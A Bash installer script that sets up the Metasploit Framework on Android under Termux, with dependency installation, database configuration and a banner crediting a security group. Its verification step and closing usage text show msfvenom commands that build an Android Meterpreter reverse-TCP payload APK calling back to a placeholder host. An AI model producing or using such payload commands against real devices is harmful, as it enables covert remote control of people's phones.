#!/data/data/com.termux/files/usr/bin/bash
clear

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Global Variables
INSTALL_DIR="$HOME/metasploit-framework"
DB_DIR="$PREFIX/var/lib/postgresql"

# Function to center text
center() {
    termwidth=$(stty size | cut -d" " -f2)
    padding="$(printf '%0.1s' ' '{1..500})"
    printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

# Function to display error and exit
error_exit() {
    echo -e "${RED}[ERROR] $1${NC}"
    exit 1
}

# Function to run commands with clean real-time output
run_cmd() {
    echo -e "${CYAN}[*] $2${NC}"
    echo -e "${YELLOW}┌───[Output]──────────────────────${NC}"
    eval "$1" || {
        echo -e "${YELLOW}└──────────────────────────────────${NC}"
        error_exit "Failed to $2"
    }
    echo -e "${YELLOW}└──────────────────────────────────${NC}"
    echo -e "${GREEN}[✓] $2 completed${NC}"
}

# Function to initialize PostgreSQL
init_postgresql() {
    echo -e "${YELLOW}[+] Initializing PostgreSQL Database...${NC}"
    
    # Stop if already running
    pg_ctl -D $DB_DIR stop >/dev/null 2>&1
    
    # Initialize database if not exists
    if [ ! -d "$DB_DIR" ]; then
        run_cmd "mkdir -p $DB_DIR" "Creating PostgreSQL directory"
        run_cmd "initdb $DB_DIR" "Initializing database"
        run_cmd "chmod 700 $DB_DIR" "Setting permissions"
    fi
    
    # Start PostgreSQL
    run_cmd "pg_ctl -D $DB_DIR -l $DB_DIR/postgres.log start" "Starting PostgreSQL"
    
    # Wait for service to start
    echo -e "${CYAN}[*] Waiting for PostgreSQL to start...${NC}"
    sleep 5
    
    # Create user and database
    run_cmd "createuser msf || true" "Creating MSF user"
    run_cmd "createdb msf_database -O msf || true" "Creating MSF database"
}

# Function to install required packages
install_dependencies() {
    echo -e "${GREEN}[1/6] Installing Dependencies...${NC}"
    run_cmd "termux-change-repo" "Configuring Termux repositories"
    run_cmd "pkg update -y" "Updating packages"
    run_cmd "pkg upgrade -y" "Upgrading packages"
    run_cmd "pkg install -y ruby git wget curl nmap openssl postgresql libffi libgmp libxml2 libxslt ncurses-utils sqlite binutils binutils-gold clang make" "Installing required packages"
}

# Function to setup Ruby environment
setup_ruby() {
    echo -e "${GREEN}[2/6] Setting Up Ruby Environment...${NC}"
    export LD=aarch64-linux-android-ld
    export LDFLAGS="-L$PREFIX/lib"
    export CPPFLAGS="-I$PREFIX/include"
    
    run_cmd "gem install bundler --no-document" "Installing Bundler"
    run_cmd "gem install nokogiri -- --use-system-libraries" "Installing Nokogiri"
    
    # Special SQLite3 installation
    run_cmd "gem install sqlite3 -- --with-sqlite3-include=$PREFIX/include --with-sqlite3-lib=$PREFIX/lib --enable-system-libraries" "Installing SQLite3"
}

# Function to install Metasploit
install_metasploit() {
    echo -e "${GREEN}[3/6] Installing Metasploit Framework...${NC}"
    run_cmd "rm -rf $INSTALL_DIR" "Cleaning previous installation"
    
    echo -e "${CYAN}[*] Cloning Metasploit......${NC}"
    echo -e "${YELLOW}┌───[Output]──────────────────────${NC}"
    git clone --depth=1 https://github.com/rapid7/metasploit-framework.git $INSTALL_DIR || {
        echo -e "${YELLOW}└──────────────────────────────────${NC}"
        error_exit "Failed to clone Metasploit"
    }
    echo -e "${YELLOW}└──────────────────────────────────${NC}"
    echo -e "${GREEN}[✓] Metasploit repository cloned${NC}"
    
    run_cmd "cd $INSTALL_DIR" "Entering Metasploit directory"
    
    # Apply Termux patches
    echo -e "${CYAN}[*] Applying Termux-specific patches...${NC}"
    [ -f "lib/msf/core/payload/apt.rb" ] && sed -i 's|@libdir = \[.*|@libdir = [\"$PREFIX/lib\"]|' lib/msf/core/payload/apt.rb
    [ -f "lib/msf/core/payload/so.rb" ] && sed -i 's|@libdir = \[.*|@libdir = [\"$PREFIX/lib\"]|' lib/msf/core/payload/so.rb
    echo -e "${GREEN}[✓] Patches applied${NC}"
    
    # Bundle configuration
    run_cmd "bundle config build.nokogiri --use-system-libraries" "Configuring Nokogiri"
    run_cmd "bundle config build.sqlite3 --with-sqlite3-include=$PREFIX/include --with-sqlite3-lib=$PREFIX/lib" "Configuring SQLite3"
    run_cmd "bundle install -j$(nproc --all)" "Installing Ruby dependencies"
}

# Function to configure database
configure_database() {
    echo -e "${GREEN}[4/6] Configuring Database...${NC}"
    init_postgresql
    
    # Create database.yml
    run_cmd "mkdir -p $HOME/.msf4" "Creating MSF4 directory"
    cat > $HOME/.msf4/database.yml <<EOF
production:
  adapter: postgresql
  database: msf_database
  username: msf
  host: 127.0.0.1
  port: 5432
  pool: 5
  timeout: 5
EOF
    echo -e "${GREEN}[✓] Database configuration created${NC}"
}

# Function to create symlinks
create_symlinks() {
    echo -e "${GREEN}[5/6] Creating Symlinks...${NC}"
    run_cmd "ln -sf $INSTALL_DIR/msfconsole $PREFIX/bin/" "Creating msfconsole symlink"
    run_cmd "ln -sf $INSTALL_DIR/msfvenom $PREFIX/bin/" "Creating msfvenom symlink"
    run_cmd "ln -sf $INSTALL_DIR/msfrpc $PREFIX/bin/" "Creating msfrpc symlink"
}

# Function to verify installation
verify_installation() {
    echo -e "${GREEN}[6/6] Verifying Installation...${NC}"
    echo -e "${CYAN}[*] Testing payload generation...${NC}"
    echo -e "${YELLOW}┌───[Output]──────────────────────${NC}"
    if msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R >/dev/null 2>&1; then
        echo -e "${YELLOW}└──────────────────────────────────${NC}"
        echo -e "${GREEN}[✓] Metasploit installed successfully!${NC}"
    else
        echo -e "${YELLOW}└──────────────────────────────────${NC}"
        error_exit "Installation verification failed"
    fi
}

# Main Installation Process
main() {
    # Display centered banner
    echo -e "${BLUE}"
    center "████████╗   ██████╗ ██╗      ██████╗ ██╗████████╗"
    center "╚══██╔══╝   ██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
    center "   ██║█████╗██████╔╝██║     ██║   ██║██║   ██║   "
    center "   ██║╚════╝██╔═══╝ ██║     ██║   ██║██║   ██║   "
    center "   ██║      ██║     ███████╗╚██████╔╝██║   ██║   "
    center "   ╚═╝      ╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
    echo -e "${NC}"
    
    # Your requested description replacing the original one
    echo -e "${PURPLE}"
    echo "       T-Ploit: Termux Metasploit (Android)"
    echo -e "${CYAN}"
    echo "        Created by: [East Timor Ghost Security]"
    echo -e "${BLUE}"
    echo "----------------------------------------------------"
    echo -e "${GREEN}  The most reliable Metasploit installer for Termux"
    echo -e "   Auto-database setup • ARM64 optimized"
    echo -e "   Verified 100% working • Detailed logging"
    echo -e "${BLUE}"
    echo "----------------------------------------------------"
    echo -e "${NC}"
    echo "============================================"
    
    # Run installation steps
    install_dependencies
    setup_ruby
    install_metasploit
    configure_database
    create_symlinks
    verify_installation
    
    # Completion message
    echo -e "${BLUE}"
    echo "============================================"
    center "METASPLOIT INSTALLATION COMPLETED"
    echo "============================================"
    echo -e "${NC}"
    echo -e "${YELLOW}Usage:${NC}"
    echo -e "msfconsole   - Start Metasploit"
    echo -e "msfvenom     - Create payloads"
    echo -e "\n${YELLOW}Example:${NC}"
    echo -e "msfvenom -p android/meterpreter/reverse_tcp"
    echo -e "LHOST=YOUR_IP LPORT=4444 -o payload.apk"
    echo -e "\n${RED}Note:${NC}"
    echo -e "First run may take 1-2 minutes to initialize database"
    echo -e "${BLUE}============================================${NC}"
}

# Start main installation process
main
